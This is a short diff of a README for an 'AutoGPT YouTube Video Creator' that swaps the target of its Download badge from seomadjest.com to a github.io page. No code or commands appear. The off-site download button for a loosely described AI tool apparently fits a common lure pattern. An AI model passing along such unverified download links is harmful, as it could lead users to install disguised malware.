@@ -2,7 +2,8 @@
 
 AutoGPT YouTube Video Creator is an AI-powered tool that automates the process of YouTube video production. From script to voiceover to visuals — AutoGPT handles it all.
 
-[![Download AutoGPT YouTube Video Creator](https://img.shields.io/badge/Download-AutoGPT_YouTube_Video_Creator-blueviolet)](https://seomadjest.com/)
+[![Download AutoGPT YouTube Video Creator](https://img.shields.io/badge/Download-AutoGPT_YouTube_Video_Creator-blueviolet)](https://gpt-youtube-video-creator.github.io/.github/
+)
 
 ---
 
